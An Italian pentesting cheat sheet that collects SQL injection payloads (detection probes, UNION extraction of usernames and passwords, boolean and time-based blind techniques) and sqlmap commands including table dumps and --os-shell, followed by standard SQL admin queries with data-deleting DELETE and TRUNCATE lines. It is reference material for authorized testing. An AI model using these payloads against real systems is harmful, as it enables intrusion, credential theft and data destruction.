---
title: "SQL Injection e Query per Database: Guida di Riferimento per Pentester"
description: "Payload per SQL injection, attacchi UNION, tecniche di blind SQLi e query standard per MySQL e PostgreSQL. Un riferimento tattico per penetration tester e amministratori di database."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["payload sql injection", "cheatsheet comandi mysql", "cheat sheet postgresql", "hacking database", "comandi sqlmap", "union sql injection", "blind sql injection", "test sql injection", "enumerazione database", "prevenzione sql injection"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection e Query per Database: Guida di Riferimento per Pentester",
    "description": "Payload per SQL injection, attacchi UNION, blind SQLi e query per database MySQL e PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "it"
  }
---

## Inizializzazione del Sistema

La SQL injection resta una delle vulnerabilità più critiche delle applicazioni web — costantemente presente nella OWASP Top 10. Si verifica quando l'input dell'utente viene concatenato direttamente nelle query SQL senza un'adeguata sanificazione, permettendo a un attaccante di manipolare la logica della query al database. Una SQL injection riuscita può portare a esfiltrazione completa dei dati, bypass dell'autenticazione, escalation dei privilegi e, in alcuni casi, esecuzione remota di comandi sul server del database. Questo manuale operativo fornisce sia i payload offensivi per test di penetrazione autorizzati, sia le query SQL standard che ogni amministratore di database deve conoscere.

Tutte le tecniche di injection sono esclusivamente per test autorizzati. L'accesso non autorizzato è illegale.

---

## Rilevamento SQLi

Prima di sfruttare una vulnerabilità SQL injection, è necessario confermarne l'esistenza. Il rilevamento consiste nell'inviare input appositamente costruiti ai parametri dell'applicazione e osservare la risposta alla ricerca di messaggi di errore, cambiamenti nel comportamento o differenze nei tempi di risposta. Queste sonde iniziali indicano se il parametro è iniettabile e quale tipo di injection è possibile.

### Payload di rilevamento base

```sql
-- Test con singolo apice (genera un errore di sintassi se vulnerabile)
'

-- Test con doppio apice
"

-- Rilevamento basato su commenti
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Test di injection numerica (sempre vero vs sempre falso)
1 OR 1=1
1 AND 1=2

-- Rilevamento basato su stringhe
' OR 'a'='a
' OR 'a'='a'--

-- Rilevamento basato su errori (forza un errore di conversione di tipo)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Rilevamento basato sul tempo (se la risposta è ritardata, l'injection esiste)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identificare il backend del database

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## Attacchi UNION

La SQL injection basata su UNION è la tecnica più potente quando i messaggi di errore o i risultati delle query vengono mostrati nella pagina. Funziona aggiungendo un'istruzione `UNION SELECT` alla query originale, permettendo di estrarre dati da qualsiasi tabella del database. Il requisito fondamentale è determinare il numero corretto di colonne nella query originale affinché l'istruzione UNION corrisponda.

### Determinare il numero di colonne

```sql
-- Usando ORDER BY (incrementare fino all'errore)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (errore a N significa che ci sono N-1 colonne)

-- Usando UNION SELECT con segnaposto NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (nessun errore significa numero di colonne corretto)
```

### Estrarre dati

```sql
-- Trovare quali colonne vengono mostrate nella pagina
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Estrarre la versione del database
' UNION SELECT NULL,@@version,NULL--

-- Estrarre il nome del database corrente
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Estrarre l'utente corrente
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- Elencare tutti i database (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- Elencare tutte le tabelle in un database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- Elencare le colonne di una tabella
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Estrarre nomi utente e password
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

Quando l'applicazione non mostra i risultati delle query o i messaggi di errore nella pagina, si tratta di blind SQL injection. La vulnerabilità esiste comunque, ma l'estrazione dei dati richiede inferenza — tramite condizioni booleane (la pagina cambia?) o ritardi temporali (la risposta impiega più tempo?). La blind SQLi è più lenta ma altrettanto pericolosa.

### Blind basata su booleani

```sql
-- Test se il primo carattere del nome del database è 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test usando valori ASCII
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Estrarre dati carattere per carattere
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Approccio a ricerca binaria (più veloce della lineare)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- È > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- È > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- È > 'p'?
```

### Blind basata sul tempo

```sql
-- MySQL: se la condizione è vera, la risposta viene ritardata di 5 secondi
' AND IF(1=1, SLEEP(5), 0)--

-- Estrarre dati usando ritardi temporali
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL basata sul tempo
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL basata sul tempo
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Automazione con SQLMap

SQLMap è lo strumento standard del settore per il rilevamento e lo sfruttamento automatizzato delle SQL injection. Gestisce rilevamento, fingerprinting, estrazione dati e persino accesso a livello di sistema operativo tramite SQL injection — tutto da riga di comando. Per i test di penetrazione autorizzati, accelera drasticamente la fase di exploitation.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Query SQL Standard

Oltre ai test di injection, ogni professionista della sicurezza e sviluppatore deve conoscere le query SQL standard per l'amministrazione dei database, l'analisi dei log e l'estrazione dei dati durante le indagini. Queste query funzionano sia su MySQL che su PostgreSQL e coprono le operazioni più comuni sui database.

### Query SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### Query JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Amministrazione del database

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
